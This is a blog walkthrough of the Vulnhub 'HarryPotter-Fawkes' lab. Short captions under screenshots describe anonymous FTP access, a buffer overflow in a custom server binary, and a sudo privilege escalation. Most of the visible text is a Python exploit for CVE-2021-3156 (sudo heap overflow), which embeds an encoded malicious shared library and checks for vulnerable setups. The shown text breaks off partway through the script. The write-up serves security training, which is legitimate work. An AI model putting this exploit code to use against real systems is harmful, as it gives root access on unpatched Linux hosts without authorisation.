<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Virtual Box address:https:&#x2F;&#x2F;download.vulnhub.com&#x2F;harrypotter&#x2F;Fawkes.ova Difficulty: HighTarget: 2 root privilege, 3 Flags">
<meta property="og:type" content="article">
<meta property="og:title" content="Vulnhub HarryPotter-Fawkes">
<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack%20[14].html">
<meta property="og:site_name" content="Kelpie Blog">
<meta property="og:description" content="Virtual Box address:https:&#x2F;&#x2F;download.vulnhub.com&#x2F;harrypotter&#x2F;Fawkes.ova Difficulty: HighTarget: 2 root privilege, 3 Flags">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fitjzqn8FBE4yBjvSg19YZkO65oX.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvbekivEBO0mTyWNLkyv1x_40bBE.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fq3zivcXgrmy8PM6vUijG0YbSUh-.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhj9D5dnl6nxSXYJKxwmtAqWd6JA.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fs6sEonSjvTOzYO0tyLfifLlS8pS.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fs3HlWS1nFS6b45_lHkoKA3xW1wP.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkxbnB-DqFvjjayGnmc6aFpx4d3v.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnWohD7ySehESS3PsTAk8EGc7uDH.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnfYQiRcN7DtVVctMWew5OpIT8BR.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Frvqu-DNLNQkjeaKpIyqUD1ClIZN.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fjigo452kOgbn0oq0xsSuxeiQ4-D.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FmTjQcLFxgw4tLkJOxtUD7pGHcGG.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlDRKfG9K54LJgVleKbt-MbuW3IY.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Ftj9M4f-yUjSiYv0buF1m4Ya2qud.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FmAnHKYWBvlPhwNJRNuynZiucvff.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fgptko-VgkTo_NIDtCXyyPJi6vxK.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpLGxXpkATPYSyZ2uoUm7NbXtIXQ.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fjgb6Fsll-QjUfr33OYuO6e2Kp4n.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoJEcU61HSdYVR_PgFnnAMI-XbUr.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fl1gW5gYFpaDIoux5V0QOu5sNY_B.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv8T4aL-1cbpGT9gu6DRBcsgIsjb.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhVKJDioryJwOgDMgU1og9R9PXpq.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fqo8a4TKluKKZE75fPvGcivc1Jja.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqEs46Bw3hL4c_qXxbNCOjQxTqpK.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvwCn58aIJiMNsChu_RCaED53FvL.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrLn4b7SojpGFOxK5gL60767AfAc.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fs-VmG0Pi0biU3XC1JC-Azj4AHgY.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoIGsn8QPQ2-pSaZVQCiIf_IH1uC.png">
<meta property="article:published_time" content="2022-02-24T23:18:00.000Z">
<meta property="article:modified_time" content="2024-04-10T09:43:12.934Z">
<meta property="article:author" content="l3vi4th4n">
<meta property="article:tag" content="Penetration Test">
<meta property="article:tag" content="Vulnhub">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fitjzqn8FBE4yBjvSg19YZkO65oX.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Vulnhub HarryPotter-Fawkes</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/post/%5BBUUCTF%5D%20PWN1.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/post/Virtual%20Attack%20%5B13%5D.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[14].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&text=Vulnhub HarryPotter-Fawkes"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&title=Vulnhub HarryPotter-Fawkes"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&is_video=false&description=Vulnhub HarryPotter-Fawkes"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Vulnhub HarryPotter-Fawkes&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[14].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&title=Vulnhub HarryPotter-Fawkes"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&title=Vulnhub HarryPotter-Fawkes"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&title=Vulnhub HarryPotter-Fawkes"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&title=Vulnhub HarryPotter-Fawkes"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[14].html&name=Vulnhub HarryPotter-Fawkes&description=&lt;p&gt;Virtual Box address:&lt;br&gt;&lt;a href=&#34;https://download.vulnhub.com/harrypotter/Fawkes.ova&#34;&gt;https://download.vulnhub.com/harrypotter/Fawkes.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Difficulty: High&lt;br&gt;Target: 2 root privilege, 3 Flags&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[14].html&t=Vulnhub HarryPotter-Fawkes"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Host-Discovery"><span class="toc-number">1.</span> <span class="toc-text">Host Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Get-shell"><span class="toc-number">2.</span> <span class="toc-text">Get shell</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Vulnhub HarryPotter-Fawkes
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">l3vi4th4n</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-02-24T23:18:00.000Z" class="dt-published" itemprop="datePublished">2022-02-24</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Penetration-Test/">Penetration Test</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Penetration-Test/" rel="tag">Penetration Test</a>, <a class="p-category" href="/tags/Vulnhub/" rel="tag">Vulnhub</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>Virtual Box address:<br><a target="_blank" rel="noopener" href="https://download.vulnhub.com/harrypotter/Fawkes.ova">https://download.vulnhub.com/harrypotter/Fawkes.ova</a></p>
<p>Difficulty: High<br>Target: 2 root privilege, 3 Flags</p>
<span id="more"></span>

<h2 id="Host-Discovery"><a href="#Host-Discovery" class="headerlink" title="Host Discovery"></a>Host Discovery</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fitjzqn8FBE4yBjvSg19YZkO65oX.png"><br>We found that port 21 opens, check it out. We can use anonymous method to o login the service to get the intensive information. But port 2222 and port Nmap98, nmap can’t figure them out. So I will check them later.</p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvbekivEBO0mTyWNLkyv1x_40bBE.png"><br>We can log in with anonymous</p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fq3zivcXgrmy8PM6vUijG0YbSUh-.png"><br>get the file first</p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fhj9D5dnl6nxSXYJKxwmtAqWd6JA.png"><br>Using netcat to connect the portreceive recvice data</p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fs6sEonSjvTOzYO0tyLfifLlS8pS.png"><br>We try to input the spell.</p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fs3HlWS1nFS6b45_lHkoKA3xW1wP.png"><br>server_hogwarts is a executable file, maybe we can find some exploit in it. For example buffer overflow..</p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkxbnB-DqFvjjayGnmc6aFpx4d3v.png"><br>After we runing the executable file, the port 9898 will open automacally in my Kali. That’s wried, but we can use Netcat to connect the localhost, to check what the happening here.</p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnWohD7ySehESS3PsTAk8EGc7uDH.png"><br>The situation is the same as the remote machine. So if we exploit the server_hogwarts, we can exploit the remote machine.</p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnfYQiRcN7DtVVctMWew5OpIT8BR.png"><br>Oh maybe it works!</p>
<p>Now we can use the gdb with peda(The tool uses in Reverse Engnering filed), to find to EIP address and how long the prefix is.</p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Frvqu-DNLNQkjeaKpIyqUD1ClIZN.png"><br>Ok we get the offset</p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fjigo452kOgbn0oq0xsSuxeiQ4-D.png"></p>
<p>So we should find the ESP address to make the CPU to execute malicious payload where we have wirte the them in ESP before.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FmTjQcLFxgw4tLkJOxtUD7pGHcGG.png"></p>
<p>OK, we know the offset and “jmp esp” command address, now we can create the mailcious payload.</p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlDRKfG9K54LJgVleKbt-MbuW3IY.png"></p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Ftj9M4f-yUjSiYv0buF1m4Ya2qud.png"></p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FmAnHKYWBvlPhwNJRNuynZiucvff.png"></p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fgptko-VgkTo_NIDtCXyyPJi6vxK.png"></p>
<h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FpLGxXpkATPYSyZ2uoUm7NbXtIXQ.png"></p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fjgb6Fsll-QjUfr33OYuO6e2Kp4n.png"></p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoJEcU61HSdYVR_PgFnnAMI-XbUr.png"></p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fl1gW5gYFpaDIoux5V0QOu5sNY_B.png"></p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv8T4aL-1cbpGT9gu6DRBcsgIsjb.png"></p>
<p>We found the vulnerability in sudo, the sudo version is exploitable<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhVKJDioryJwOgDMgU1og9R9PXpq.png"></p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fqo8a4TKluKKZE75fPvGcivc1Jja.png"></p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqEs46Bw3hL4c_qXxbNCOjQxTqpK.png"></p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvwCn58aIJiMNsChu_RCaED53FvL.png"></p>
<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrLn4b7SojpGFOxK5gL60767AfAc.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>
<span class="token triple-quoted-string string">'''
Exploit for CVE-2021-3156 with overwrite struct service_user by sleepya
This exploit requires:
- glibc with tcache
- nscd service is not running
Tested on:
- Ubuntu 18.04
- Ubuntu 20.04
- Debian 10
- CentOS 8
'''</span>
<span class="token keyword">import</span> os
<span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll<span class="token punctuation">,</span> c_char_p<span class="token punctuation">,</span> POINTER<span class="token punctuation">,</span> c_int<span class="token punctuation">,</span> c_void_p

SUDO_PATH <span class="token operator">=</span> <span class="token string">b"/usr/local/bin/sudo"</span>

libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>

<span class="token comment"># don't use LC_ALL (6). it override other LC_</span>
LC_CATS <span class="token operator">=</span> <span class="token punctuation">[</span>
	<span class="token string">b"LC_CTYPE"</span><span class="token punctuation">,</span> <span class="token string">b"LC_NUMERIC"</span><span class="token punctuation">,</span> <span class="token string">b"LC_TIME"</span><span class="token punctuation">,</span> <span class="token string">b"LC_COLLATE"</span><span class="token punctuation">,</span> <span class="token string">b"LC_MONETARY"</span><span class="token punctuation">,</span>
	<span class="token string">b"LC_MESSAGES"</span><span class="token punctuation">,</span> <span class="token string">b"LC_ALL"</span><span class="token punctuation">,</span> <span class="token string">b"LC_PAPER"</span><span class="token punctuation">,</span> <span class="token string">b"LC_NAME"</span><span class="token punctuation">,</span> <span class="token string">b"LC_ADDRESS"</span><span class="token punctuation">,</span>
	<span class="token string">b"LC_TELEPHONE"</span><span class="token punctuation">,</span> <span class="token string">b"LC_MEASUREMENT"</span><span class="token punctuation">,</span> <span class="token string">b"LC_IDENTIFICATION"</span>
<span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">check_is_vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token comment"># below commands has no log because it is invalid argument for both patched and unpatched version</span>
	<span class="token comment"># patched version, error because of '-s' argument</span>
	<span class="token comment"># unpatched version, error because of '-A' argument but no SUDO_ASKPASS environment</span>
	r<span class="token punctuation">,</span> w <span class="token operator">=</span> os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span>
	pid <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> <span class="token keyword">not</span> pid<span class="token punctuation">:</span>
		<span class="token comment"># child</span>
		os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
		execve<span class="token punctuation">(</span>SUDO_PATH<span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token string">b"sudoedit"</span><span class="token punctuation">,</span> <span class="token string">b"-s"</span><span class="token punctuation">,</span> <span class="token string">b"-A"</span><span class="token punctuation">,</span> <span class="token string">b"/aa"</span><span class="token punctuation">,</span> <span class="token boolean">None</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span> <span class="token boolean">None</span> <span class="token punctuation">]</span><span class="token punctuation">)</span>
		exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token comment"># parent</span>
	os<span class="token punctuation">.</span>close<span class="token punctuation">(</span>w<span class="token punctuation">)</span>
	os<span class="token punctuation">.</span>waitpid<span class="token punctuation">(</span>pid<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
	r <span class="token operator">=</span> os<span class="token punctuation">.</span>fdopen<span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
	err <span class="token operator">=</span> r<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

	<span class="token keyword">if</span> <span class="token string">"sudoedit: no askpass program specified, try setting SUDO_ASKPASS"</span> <span class="token keyword">in</span> err<span class="token punctuation">:</span>
		<span class="token keyword">return</span> <span class="token boolean">True</span>
	<span class="token keyword">assert</span> err<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'usage: '</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">"invalid mode flags "</span> <span class="token keyword">in</span> err<span class="token punctuation">,</span> err
	<span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">create_libx</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
	so_path <span class="token operator">=</span> <span class="token string">'libnss_'</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">'.so.2'</span>
	<span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>so_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span>  <span class="token comment"># existed</span>

	so_dir <span class="token operator">=</span> <span class="token string">'libnss_'</span> <span class="token operator">+</span> name<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
	<span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>so_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>
		os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>so_dir<span class="token punctuation">)</span>

	<span class="token keyword">import</span> zlib
	<span class="token keyword">import</span> base64

	libx_b64 <span class="token operator">=</span> <span class="token string">'eNqrd/VxY2JkZIABZgY7BhBPACrkwIAJHBgsGJigbJAydgbcwJARlWYQgFBMUH0boMLodAIazQGl\neWDGQM1jRbOPDY3PhcbnZsAPsjIjDP/zs2ZlRfCzGn7z2KGflJmnX5zBEBASn2UdMZOfFQDLghD3'</span>
	<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>so_path<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
		f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>libx_b64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token comment">#os.chmod(so_path, 0o755)</span>

<span class="token keyword">def</span> <span class="token function">check_nscd_condition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'/var/run/nscd/socket'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token comment"># no socket. no service</span>

	<span class="token comment"># try connect</span>
	<span class="token keyword">import</span> socket
	sk <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_UNIX<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
	<span class="token keyword">try</span><span class="token punctuation">:</span>
		sk<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'/var/run/nscd/socket'</span><span class="token punctuation">)</span>
	<span class="token keyword">except</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> <span class="token boolean">True</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		sk<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

	<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/etc/nscd.conf'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
		<span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>
			line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> <span class="token keyword">not</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'enable-cache'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
				<span class="token keyword">continue</span> <span class="token comment"># comment</span>
			service<span class="token punctuation">,</span> enable <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
			<span class="token comment"># in fact, if only passwd is enabled, exploit with this method is still possible (need test)</span>
			<span class="token comment"># I think no one enable passwd but disable group</span>
			<span class="token keyword">if</span> service <span class="token operator">==</span> <span class="token string">'passwd'</span> <span class="token keyword">and</span> enable <span class="token operator">==</span> <span class="token string">'yes'</span><span class="token punctuation">:</span>
				<span class="token keyword">return</span> <span class="token boolean">False</span>
			<span class="token comment"># group MUST be disabled to exploit sudo with nss_load_library() trick</span>
			<span class="token keyword">if</span> service <span class="token operator">==</span> <span class="token string">'group'</span> <span class="token keyword">and</span> enable <span class="token operator">==</span> <span class="token string">'yes'</span><span class="token punctuation">:</span>
				<span class="token keyword">return</span> <span class="token boolean">False</span>

	<span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">get_libc_version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	output <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ldd'</span><span class="token punctuation">,</span> <span class="token string">'--version'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> universal_newlines<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
	<span class="token keyword">for</span> line <span class="token keyword">in</span> output<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">if</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'ldd '</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			ver_txt <span class="token operator">=</span> line<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
			<span class="token keyword">return</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> ver_txt<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token keyword">def</span> <span class="token function">check_libc_version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	version <span class="token operator">=</span> get_libc_version<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">assert</span> version<span class="token punctuation">,</span> <span class="token string">"Cannot detect libc version"</span>
	<span class="token comment"># this exploit only works which glibc tcache (added in 2.26)</span>
